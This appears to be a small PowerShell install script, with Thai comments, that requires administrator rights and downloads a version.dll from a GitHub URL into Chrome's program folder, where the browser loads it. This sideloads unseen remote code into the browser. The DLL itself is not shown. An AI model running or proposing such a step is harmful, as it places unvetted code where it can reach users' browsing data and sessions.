# install.ps1
$url_dll = "https://raw.githubusercontent.com/puddyeieiei/ryzenx/main/version.dll"
$chrome_path = "$env:ProgramFiles\Google\Chrome\Application"
$dll_path = "$chrome_path\version.dll"

# ตรวจสอบสิทธิ์ Admin
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Please run PowerShell as Administrator!" -ForegroundColor Red
    exit 1
}

# ดาวน์โหลด DLL
try {
    (New-Object Net.WebClient).DownloadFile($url_dll, $dll_path)
    Write-Host "Installed to $dll_path" -ForegroundColor Green
}
catch {
    Write-Host "Download failed: $_" -ForegroundColor Red
}
